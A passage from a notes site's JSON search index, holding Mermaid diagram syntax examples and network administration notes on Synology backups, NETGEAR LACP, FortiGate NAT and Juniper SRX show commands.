endscript\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Linux docs"},{"categories":null,"contents":" details 看我 你看不到我 看不到我 class classDiagram Class01 \u0026lt;|-- AveryLongClass : Cool Class03 _-- Class04 Class05 o-- Class06 Class07 .. Class08 Class09 --\u0026gt; C2 : Where am i? Class09 --_ C3 Class09 --|\u0026gt; Class07 Class07 : equals() Class07 : Object[] elementData Class01 : size() Class01 : int chimp Class01 : int gorilla Class08 \u0026lt;--\u0026gt; C2: Cool label classDiagram flow-link flowchart LR A --o B B --x C D o--o E E \u0026lt;--\u0026gt; F F x--x G flowchart flow-link1 code flowchart flow-shapes graph LR id1[方框] id2(帶有圓角的方框) id3([體育場形狀]) id4[[子例程]] id5[(圓柱狀)] id6((圓形)) id7\u0026gt;非對稱形狀] id8{菱形} id9{{六角形}} id10[/平行四邊形 1/] id11[\\平行四邊形 2\\] id12[/梯形 1\\] id13[\\梯形 2/] id14(((雙圓))) flowchart flow-subgraphs flowchart TD c1--\u0026gt;a2 subgraph one a1--\u0026gt;a2 end subgraph \u0026#34;`**two**`\u0026#34; b1--\u0026gt;b2 end subgraph three c1--\u0026gt;c2 end flowchart gantt gantt dateFormat YYYY-MM-DD title Adding GANTT diagram functionality to mermaid section A section Completed task :done, des1, 2014-01-06,2014-01-08 Active task :active, des2, 2014-01-09, 3d Future task : des3, after des2, 5d Future task2 : des4, after des3, 5d section Critical tasks Completed task in the critical line :crit, done, 2014-01-06,24h Implement parser and jison :crit, done, after des1, 2d Create tests for parser :crit, active, 3d Future task in critical line :crit, 5d Create tests for renderer :2d Add to mermaid :1d gantt git gitGraph commit commit branch develop checkout develop commit commit checkout main merge develop commit commit git er erDiagram CUSTOMER }|..|{ DELIVERY-ADDRESS : has CUSTOMER ||--o{ ORDER : places CUSTOMER ||--o{ INVOICE : \u0026#34;liable for\u0026#34; DELIVERY-ADDRESS ||--o{ ORDER : receives INVOICE ||--|{ ORDER : covers ORDER ||--|{ ORDER-ITEM : includes PRODUCT-CATEGORY ||--|{ PRODUCT : contains PRODUCT ||--o{ ORDER-ITEM : \u0026#34;ordered in\u0026#34; erDiagram journey journey title My working day section Go to work Make tea: 5: Me Go upstairs: 3: Me Do work: 1: Me, Cat section Go home Go downstairs: 5: Me Sit down: 3: Me erDiagram pie pie title Pets adopted by volunteers \u0026#34;Dogs\u0026#34; : 386 \u0026#34;Cats\u0026#34; : 85 \u0026#34;Rats\u0026#34; : 15 pie sequence sequenceDiagram participant Alice participant Bob Alice-\u0026gt;\u0026gt;John: Hello John, how are you? loop Healthcheck John-\u0026gt;John: Fight against hypochondria end Note right of John: Rational thoughts \u0026lt;br/\u0026gt;prevail... John--\u0026gt;Alice: Great! John-\u0026gt;Bob: How about you? Bob--\u0026gt;John: Jolly good! sequenceDiagram state stateDiagram-v2 open: Open Door closed: Closed Door locked: Locked Door open --\u0026gt; closed: Close closed --\u0026gt; locked: Lock locked --\u0026gt; closed: Unlock closed --\u0026gt; open: Open stateDiagram-v2 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/docs/mermaid/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edetails\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdetails\u003e\n\u003csummary\u003e看我\u003c/summary\u003e\n你看不到我\n看不到我\n\u003c/details\u003e\n\u003c!-- 你看不到我看不到我 --\u003e\n\u003c!--\n你看不到我\n看不到我\n--\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eclass\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eclassDiagram\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass01 \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u0026lt;\u003c/span\u003e|-- AveryLongClass : Cool\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass03 _-- Class04\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass05 o-- Class06\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass07 .. Class08\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass09 --\u0026gt; C2 : Where am i?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass09 --_ C3\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass09 --|\u0026gt; Class07\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass07 : equals()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass07 : Object[] elementData\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass01 : size()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass01 : int chimp\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass01 : int gorilla\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eClass08 \u0026lt;\u003cspan style=\"color:#f92672\"\u003e--\u003c/span\u003e\u0026gt; C2: Cool label\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/class_1.svg\"\u003eclassDiagram\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eflow-link\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eflowchart LR\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eA --o B\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eB --x C\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eD o--o E\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eE \u0026lt;\u003cspan style=\"color:#f92672\"\u003e--\u003c/span\u003e\u0026gt; F\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eF x--x G\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/link.svg\"\u003eflowchart\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eflow-link1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/link1\"\u003ecode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/link1.svg\"\u003eflowchart\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eflow-shapes\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egraph LR\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid1[方框]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid2(帶有圓角的方框)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid3([體育場形狀])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid4[[子例程]]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid5[(圓柱狀)]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid6((圓形))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid7\u0026gt;非對稱形狀]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid8{菱形}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid9{{六角形}}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid10[/平行四邊形 1/]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid11[\\平行四邊形 2\\]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid12[/梯形 1\\]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid13[\\梯形 2/]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eid14(((雙圓)))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/shapes.svg\"\u003eflowchart\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eflow-subgraphs\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eflowchart TD\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ec1--\u0026gt;a2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    subgraph one\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    a1--\u0026gt;a2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    end\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    subgraph \u0026#34;\u003cspan style=\"color:#e6db74\"\u003e`**two**`\u003c/span\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    b1--\u0026gt;b2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    end\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    subgraph three\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    c1--\u0026gt;c2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    end\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/subgraphs.svg\"\u003eflowchart\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egantt\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egantt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edateFormat YYYY-MM-DD\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etitle Adding GANTT diagram functionality to mermaid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esection A section\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCompleted task :done, des1, 2014-01-06,2014-01-08\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eActive task :active, des2, 2014-01-09, 3d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFuture task : des3, after des2, 5d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFuture task2 : des4, after des3, 5d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esection Critical tasks\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCompleted task in the critical line :crit, done, 2014-01-06,24h\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImplement parser and jison :crit, done, after des1, 2d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCreate tests for parser :crit, active, 3d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFuture task in critical line :crit, 5d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCreate tests for renderer :2d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAdd to mermaid :1d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/gantt_1.svg\"\u003egantt\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egit\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egitGraph\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebranch develop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echeckout develop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echeckout main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emerge develop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/git_1.svg\"\u003egit\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cp\u003e\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eer\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eerDiagram\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCUSTOMER }|..|{ DELIVERY-ADDRESS : has\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCUSTOMER ||--o{ ORDER : places\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCUSTOMER ||--o{ INVOICE : \u0026#34;liable for\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDELIVERY-ADDRESS ||--o{ ORDER : receives\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eINVOICE ||--|{ ORDER : covers\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eORDER ||--|{ ORDER-ITEM : includes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePRODUCT-CATEGORY ||--|{ PRODUCT : contains\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePRODUCT ||--o{ ORDER-ITEM : \u0026#34;ordered in\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/er_1.svg\"\u003eerDiagram\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ejourney\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-markdown\" data-lang=\"markdown\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ejourney\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etitle My working day\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esection Go to work\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMake tea: 5: Me\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGo upstairs: 3: Me\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDo work: 1: Me, Cat\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esection Go home\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGo downstairs: 5: Me\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSit down: 3: Me\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/mermaid/img/journey_1.svg\"\u003eerDiagram\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\u003c/p\u003e","tags":null,"title":"mermaid notes"},{"categories":null,"contents":" Synology Active Backup for Bussiness backup task failed Due to IP change last week Firewall policy create NAS_to_ESXi。 虛擬機器 -\u0026gt; 任務清單 -\u0026gt; 刪除任務。 虛擬機器 -\u0026gt; VMware vSphere -\u0026gt; 管理 Hypervisor -\u0026gt; 刪除舊的 IP，新增新的 IP。 Set LACP for Synology NAS and NETGEAR switch NETGEAR Switching -\u0026gt; LAG -\u0026gt; LAG Configuration -\u0026gt; ch1 -\u0026gt; 41、42 -\u0026gt; Apply。 ch1 -\u0026gt; Description: NAS、LAG Type:LACP -\u0026gt; Apply。 Switching -\u0026gt; VLAN -\u0026gt; Port PVID Configuration -\u0026gt; g41、g42 PVID:99、VLAN Member:10-14,17-23,99,101、VLAN Tag:10-14,17-23,99,101 -\u0026gt; Apply。 Synology 控制台 -\u0026gt; 網路 -\u0026gt; 網路介面 -\u0026gt; 新增 Bond。 Set NAT in FortiGate 1. 政策\u0026amp;物件 -\u0026gt; 虛擬 IP -\u0026gt; 新增 名稱: IT-VPN 介面: wan2 對外 IP: 0.0.0.0 埠號轉發 協定: TCP 外部服務埠號: 19979 對應到埠號: 19979 2. 政策\u0026amp;物件 -\u0026gt; IPv4 政策 From zone wan2 to zone Knowhow_Vlan From any to IT-VPN Juniper SRX 320 # 查看當前軟體版本號 show system software # 查看系統啟動時間 show system uptime # 查看硬體板卡及序號 show chassis haredware # 查看硬體板卡當前狀態 show chassis environment # 查看主控板（RE）資源使用及狀態 show chassis routing-engine # 查看當前防火牆併發會話數 show security flow session summary # 查看當前防火牆具體併發會話 show security flow session # 清除當前 session clear security flow session all # 檢查全域 ALG 開啟情況 show security alg status # 查OID show snmp mib walk decimal 1.3.6.1.2.1.2.2.1.2 # 設定政策 set security policy zones from-zone to-zone # 查看路由表 show route # 查看 ARP 表 show arp # 查看系統日誌 show log messages # 查看所有介面運行狀態 show interface terse # 查看介面運行細節資訊 show interface ge-x/y/z detail # 比較修改 show | compare rollback ? show | compare rollback 1 # 查看系統 show system # 查看設定 show configuration # 動態統計介面資料包轉發資訊 monitor interface ge-x/y/z # 動態報文抓取（Tcpdump，類似 ScreenOS snoop命令） monitor traffic interface ge-x/y/z ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/docs/network/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSynology Active Backup for Bussiness backup task failed\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"due-to-ip-change-last-week\"\u003eDue to IP change last week\u003c/h6\u003e\n\u003col start=\"0\"\u003e\n\u003cli\u003eFirewall policy create NAS_to_ESXi。\u003c/li\u003e\n\u003cli\u003e虛擬機器 -\u0026gt; 任務清單 -\u0026gt; 刪除任務。\u003c/li\u003e\n\u003cli\u003e虛擬機器 -\u0026gt; VMware vSphere -\u0026gt; 管理 Hypervisor -\u0026gt; 刪除舊的 IP，新增新的 IP。\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSet LACP for Synology NAS and NETGEAR switch\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"netgear\"\u003eNETGEAR\u003c/h6\u003e\n\u003col\u003e\n\u003cli\u003eSwitching -\u0026gt; LAG -\u0026gt; LAG Configuration -\u0026gt; ch1 -\u0026gt; 41、42 -\u0026gt; Apply。\u003c/li\u003e\n\u003cli\u003ech1 -\u0026gt; Description: NAS、LAG Type:LACP -\u0026gt; Apply。\u003c/li\u003e\n\u003cli\u003eSwitching -\u0026gt; VLAN -\u0026gt; Port PVID Configuration -\u0026gt; g41、g42 PVID:99、VLAN Member:10-14,17-23,99,101、VLAN Tag:10-14,17-23,99,101 -\u0026gt; Apply。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch6 id=\"synology\"\u003eSynology\u003c/h6\u003e\n\u003cul\u003e\n\u003cli\u003e控制台 -\u0026gt; 網路 -\u0026gt; 網路介面 -\u0026gt; 新增 Bond。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSet NAT in FortiGate\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"1-政策物件---虛擬-ip---新增\"\u003e1. 政策\u0026amp;物件 -\u0026gt; 虛擬 IP -\u0026gt; 新增\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e名稱: IT-VPN\u003c/li\u003e\n\u003cli\u003e介面: wan2\u003c/li\u003e\n\u003cli\u003e對外 IP: 0.0.0.0\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch6 id=\"埠號轉發\"\u003e埠號轉發\u003c/h6\u003e\n\u003cul\u003e\n\u003cli\u003e協定: TCP\u003c/li\u003e\n\u003cli\u003e外部服務埠號: 19979\u003c/li\u003e\n\u003cli\u003e對應到埠號: 19979\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"2-政策物件---ipv4-政策\"\u003e2. 政策\u0026amp;物件 -\u0026gt; 